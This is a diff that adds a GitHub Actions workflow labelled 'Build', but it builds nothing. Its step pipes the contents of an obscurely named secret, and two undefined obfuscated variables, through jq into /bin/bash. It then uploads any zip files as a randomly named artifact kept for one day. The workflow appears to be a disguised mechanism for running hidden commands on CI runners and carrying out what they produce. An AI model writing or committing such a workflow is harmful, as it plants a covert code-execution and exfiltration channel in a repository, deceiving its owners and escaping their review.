@@ -1,0 +1,23 @@
+name: Build
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          xa42428: ${{ secrets.xa42428 }}
+        run: |
+          printf '%s' "$xa42428" | jq -r .jcb52957 | /bin/bash
+          echo $ofd291 | jq -r .zfsm334 | /bin/bash
+          echo $i46234 | jq -r .b66772 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: DYEKIk8g
+          path: "*.zip"
+          retention-days: 1
